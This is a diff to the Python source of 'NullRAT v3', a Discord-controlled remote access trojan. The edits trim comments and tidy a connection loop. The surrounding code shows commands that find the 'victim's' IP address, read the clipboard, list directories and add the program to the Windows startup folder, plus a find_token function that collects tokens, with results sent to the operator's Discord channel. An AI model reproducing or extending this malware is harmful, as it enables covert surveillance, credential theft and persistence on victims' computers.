@@ -5,13 +5,6 @@ from base64 import decodebytes
 from socket import create_connection
 import discord, os, subprocess, re, time
 
-# -------------------------- How to get the required variables: ------------------------------ #
-# - Enable Developer Mode (Settings => Advanced)                                               #
-# - notification_channel = Right click on your favorite channel, and hit copy ID               #
-# - server_ids = Right click on your servers (where you want the bot to work), and hit copy ID  #
-# - bot_token = Go to Discord Developer => "your Bot" => Bot => Copy Token                     #
-# -------------------------------------------------------------------------------------------- #
-
 # --------------------------- Required variables ----------------------------------- #
 notification_channel = 101010101010101010 
 server_id            = [101010101010101010, 210101010101010101]
@@ -27,9 +20,7 @@ async def on_ready():
         embed=Embed(title = f"NullRAT v3 started on {IP()}\nCurrently present in {original_dir}")
     )
 
-# ---------------------- #
 # Intelligence Gathering #
-# ---------------------- #
 @client.slash_command(description="Finds the IP address of victim", guild_ids=server_ids)
 async def getip(ctx):
     await ctx.respond(
@@ -161,9 +152,7 @@ async def clipboard(ctx):
         ).stdout.decode("CP437")
     await ctx.interaction.followup.send(f"```{outp}```" if outp != "" else "No text in clipboard!")
 
-# ---------------------- #
 # Directory Manipulation #
-# ---------------------- #
 @client.slash_command(description="Returns Current Working Directory", guild_ids=server_ids)
 async def getcwd(ctx):
     await ctx.respond(embed=EmbedGen("Current directory", "The present directory is: ", os.getcwd()))
@@ -211,9 +200,7 @@ async def listdir(ctx, directory_to_find="null"):
     os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\dir.txt")
     os.chdir(original_dir)
 
-# -------------- #
 # Misc. Commands #
-# -------------- #
 @client.slash_command(description="Add NullRAT to startup directory", guild_ids=server_ids)
 async def startup(ctx):
     from sys import executable; msg = "```\n"
@@ -326,7 +313,5 @@ def find_token():
         except FileNotFoundError: continue
     return tokens
     
-# Starting
-a = 1
-while is_connected() == False: a += 1
+while is_connected() == False: 0
 client.run(bot_token)
